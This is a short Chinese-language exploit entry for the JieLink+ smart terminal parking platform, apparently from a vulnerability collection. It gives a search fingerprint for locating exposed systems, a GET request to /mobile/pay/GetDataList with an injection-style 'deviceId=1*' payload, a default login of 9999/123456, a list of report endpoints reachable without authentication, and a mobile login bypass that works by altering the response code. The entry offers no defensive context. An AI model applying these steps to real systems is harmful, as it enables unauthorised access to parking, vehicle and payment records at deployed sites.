# JieLink+智能终端操作平台近期漏洞合集

- **系统**：JieLink+智能终端操作平台近期漏洞合集　|　**类型**：其他　|　**CVE**：—
- **指纹**：`title=="JieLink+智能终端操作平台"`
- **请求**：`GET /mobile/pay/GetDataList?plate=&mobile=&pageSize=100&pageIndex=1 HTTP/1.1`
- **关键头**：`Host: ip:port`　`Content-Length: 20`　`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
deviceId=1*
```

**其他**
- 2.默认口令: | 账号：9999<br/>密码：123456
| ---
- **4.未授权访问**: | /report/ParkInsideRecordEdit/Index<br/>/Report/ParkInsideRecord/Index<br/>/Report/ParkChargeRecord/Index<br/>/Report/ParkOutRecord/Index<br/>/Report/ParkEnterRecord/Index<br/>/Report/ParkCommon/GetAvailableMealList<br/>/report/ParkEnterRecord/GetDataList
| ---
- 1 **mobile端登录绕过**: | [http://ip:port/mobile](http://ip:port/mobile)<br/><br/>拦截响应包，将code值改为0<br/><br/>成功登录，功能可正常使用<br/>
| ---